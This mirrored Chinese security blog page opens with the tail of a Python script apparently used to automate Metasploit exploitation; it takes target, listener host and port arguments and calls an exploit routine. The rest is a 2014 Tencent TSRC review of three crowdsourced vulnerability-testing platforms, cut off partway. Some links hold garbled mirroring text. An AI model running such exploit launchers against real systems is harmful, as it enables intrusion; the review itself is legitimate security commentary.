#dd1144" class="str">'Specify&nbsp;a&nbsp;local&nbsp;host'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parser</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">add_option</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'-s'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;dest</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'session'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;type</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'string'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&#92; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'specify&nbsp;session&nbsp;ID'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">options</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;args</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;parser</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">parse_args</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">()</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;session</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">options</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">session &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">options</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">;</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">options</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">;</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LPORT</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">options</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">LPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">if</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">==</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">None</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">and</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">LPORT&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">==</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">None</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">and</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">==</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">None</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">):</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">print</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;parser</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">usage &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">exit</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #195f91" class="lit">0</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;builder</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LPORT</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sploiter</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LPORT</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;session</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">if</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;__name__&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">==</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;__main__&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">:</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;main</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">()</span></pre><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px"><span style="box-sizing: border-box; color: #262626"><span style="box-sizing: border-box; font-weight: 700">[作者/zusheng，<a style="box-sizing: border-box; outline: none; color: #069aef; background: 0px 0px" href="javascript:if(confirm('http://www.primalsecurity.net/content/images/2016/06/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/index.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.primalsecurity.net/content/images/2016/06/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/index.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/'" tppabs="http://www.primalsecurity.net/python-for-metasploit-automation/" target="_blank">原文地址</a>，转载请注明来自FreeBuf黑客与极客（FreeBuf.COM）]</span></span></p>
	</div>
	<div class="textbox-bottom">
	</div>
	<div class="tags" style="display: none"> 
	</div>
</div><div class="textbox">
	<div class="textbox-calendar">
	<span class="textbox-calendar-month">Dec</span>
	<span class="textbox-calendar-day">9</span>
	</div>
	<div class="textbox-title">
		<h4>
		<a href="read.php-6214.htm" tppabs="http://i.renjihe.com/blog/read.php?6214">国内三大安全众测平台体验报告</a> <span id="starid6214"><img src="unstarred.gif" tppabs="http://i.renjihe.com/blog/template/default/images/others/unstarred.gif" alt="" title="未加星标" border="0"/></span> <img src="blank.gif" tppabs="http://i.renjihe.com/blog/images/weather/blank.gif" alt="不指定" title="不指定"/>
		</h4>
		<div class="textbox-label">
		<a href="view.php-go=user_1.htm" tppabs="http://i.renjihe.com/blog/view.php?go=user_1" target="_blank">renjihe1988</a> , 22:08 , <a href="index.php-go=category_2.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_2" title="查看分类： 软件">软件</a> &raquo; <a href="index.php-go=category_57.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57" title="查看分类： 网络安全">网络安全</a> , <a href="read.php-6214.htm#reply" tppabs="http://i.renjihe.com/blog/read.php?6214#reply" title="发表您的评论">评论(0)</a> , <a href='javascript: void(0);' title="查看引用地址" onclick='showhidediv("tb6214");'>引用(0)</a> , <a href="read.php-6214.htm" tppabs="http://i.renjihe.com/blog/read.php?6214">阅读(1)</a> , Via 本站原创 
		</div>
	</div>
	<div id="tb6214" style="display: none;" class="textbox-tburl"><strong>引用功能被关闭了。</strong></div>
	
	<div class="textbox-content">
	<p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong>博文作者：宋襄</strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong>发布日期：2014-07-29</strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong>阅读次数：3888</strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong>博文内容：</strong></p><br /><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span><br /></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong><span style="font-family: 微软雅黑, sans-serif">【TSRC编者按】<br /><br /></span></strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>随着众包（Crowd-sourcing）模式的兴起和发展，安全测试也进入了这一领域。对于中小企业来说，使用众包模式进行安全测试，相对自行组建安全团队或者购买安全服务更能节约成本，提高效率。<br /><br /></span></strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>目前国内有三大安全众测平台：乌云众测、漏洞盒子、Sobug白帽众测。为了对国内的安全众测平台进行体验和支持，腾讯安全应急响应中心（TSRC）特别与三大平台进行了合作，完成了本报告，供对该领域感兴趣的读者参考。</span></strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong><span style="font-size: 12pt; font-family: 微软雅黑, sans-serif">一）概述</span></strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">所谓安全众测，就是众包（Crowd-sourcing）模式在安全测试领域的一种表现。也就是企业把自己的产品给到安全众测平台，由平台的安全人员（这些安全人员也不隶属平台，而是来自互联网）进行安全测试。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>这种众包模式对没有自己的安全团队的中小企业帮助较大，可以低成本地发现和修复安全问题。对于有自己的安全团队的大型企业，也非常有用，第三方的安全测试报告可以帮助安全团队从另外的角度审视自己的能力和系统。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">如果按照上述定义，腾讯安全应急响应中心（TSRC）的漏洞提交平台（&nbsp;<a style="text-decoration: none; outline: none; color: #002e8c" href="javascript:if(confirm('http://security.tencent.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://security.tencent.com/'" tppabs="http://security.tencent.com/">http://security.tencent.com</a>&nbsp;）也算是一个厂商自己的安全众测平台，不过没有固定的项目，而是所有产品线无限期参与众测。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>本文关注的是国内的第三方安全众测平台。目前国内有三家第三方安全众测平台：乌云众测、漏洞盒子和Sobug，为了对这些创业团队表示支持及对众测模式的探索，TSRC分别与三家平台达成了合作：我们各给出一款产品给到它们进行测试，TSRC以参与企业的角度输出这份体验报告。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>那么，开始我们的安全众测平台体验之旅吧。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong><span style="font-size: 12pt; font-family: 微软雅黑, sans-serif">二）乌云众测</span></strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"></p><div style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img style="border: 0px; max-width: 854px" src="read-2.php-6667" tppabs="http://security.tencent.com/uploadimg_dir/201407/d635429abc8b5e2bd53d477e74a30d4f.png" border="0" /></span></div><span style="font-size: 14px; line-height: 24px; font-family: 微软雅黑, sans-serif; color: #333333"><br /></span><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">图</span><span style="font-family: 微软雅黑, sans-serif">1&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">乌云众测平台宣传图</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>乌云众测（<a style="text-decoration: none; outline: none; color: #002e8c" href="javascript:if(confirm('http://ce.wooyun.org/read.php?6665  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://ce.wooyun.org/read.php?6665'" tppabs="http://ce.wooyun.org/home">http://ce.wooyun.org</a>&nbsp;）是国内著名漏洞报告平台乌云网（<a style="text-decoration: none; outline: none; color: #002e8c" href="javascript:if(confirm('http://www.wooyun.org/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.wooyun.org/'" tppabs="http://www.wooyun.org/">http://www.wooyun.org</a>&nbsp;）的一个新的业务，它依托乌云平台上的优秀白帽子来进行安全测试工作，也是国内第一家安全众测平台，无论是从参与测试的人数还是参与人员的能力上来看，乌云众测应该都是目前国内比较强的。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">先从帐号注册说起。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>乌云众测是直接给厂商提供帐号和密码的，期间未见到其它的验证流程（身份鉴别），如果有冒充第三方厂商的恶意者，可能会存在一定风险。当然在早期可以人工审核，未来业务量大起来，可能就要考虑自动化验证了。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">从登录帐号起，乌云众测全程都未使用HTTPS传输，链路传输中容易被窃听，这点让对漏洞信息高度敏感的厂商比较介意。期望后续能够采用HTTPS传输。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">然后是体验问题。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">当有白帽子提交漏洞时，乌云众测会发系统消息提醒企业。最初乌云众测并没有直接的漏洞查看功能，后来添加了漏洞列表菜单，可惜又不是独立页面，而是躲在评估项目页面最下方一个不起眼的地方，不小心就忽视了，特别是对于漏洞审核者，在审核时确实有很多不便。这点在用户体验上确实有待改进。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"></p><div style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img style="border: 0px; max-width: 854px" src="index-2.php-mode=2&page=14" tppabs="http://security.tencent.com/uploadimg_dir/201407/71cdce57a6e982870219ef5af4cb12df.png" border="0" /></span></div><span style="font-size: 14px; line-height: 24px; font-family: 微软雅黑, sans-serif; color: #333333"><br /></span><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">图</span><span style="font-family: 微软雅黑, sans-serif">2&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">乌云众测平台消息提醒界面</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">白帽子提交漏洞后，乌云众测官方并不作审核，即使是重复提交或者提交的内容根本不是漏洞（比如抱怨产品用户体验差），都会直接反馈给厂商。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img style="border: 0px; max-width: 854px" src="read-2.php-6664" tppabs="http://security.tencent.com/uploadimg_dir/201407/8a113600d073fa76fd588590cf868027.png" border="0" /><br /><br /></span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">图</span><span style="font-family: 微软雅黑, sans-serif">3&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">与安全问题无关的提交示例</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">厂商在乌云众测上确认漏洞时，是无法直接给漏洞评级的。开始只有两个选项：&ldquo;忽略&rdquo;或者&ldquo;确认&rdquo;。必须在确认漏洞之后，原先的&ldquo;忽略&rdquo;才会变成评级按钮，可能部分厂商起初都会以为乌云众测上没漏洞评级功能（TSRC的几个小伙伴就这样中招了）。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>建议将&ldquo;确认&rdquo;操作与&ldquo;漏洞评级&rdquo;结合在一个操作上。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">乌云众测基本是按照&ldquo;漏洞确认&rdquo;、&ldquo;漏洞沟通&rdquo;、&ldquo;评级沟通&rdquo;、&ldquo;最终评级&rdquo;这样的流程来评定漏洞等级的，最终的评级由厂商、白帽子、平台三方共同讨论决定。虽然理解这是出于公平性的考虑，但是三方意见不容易一致，将会耗用较多的人力，拖慢审核进度。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 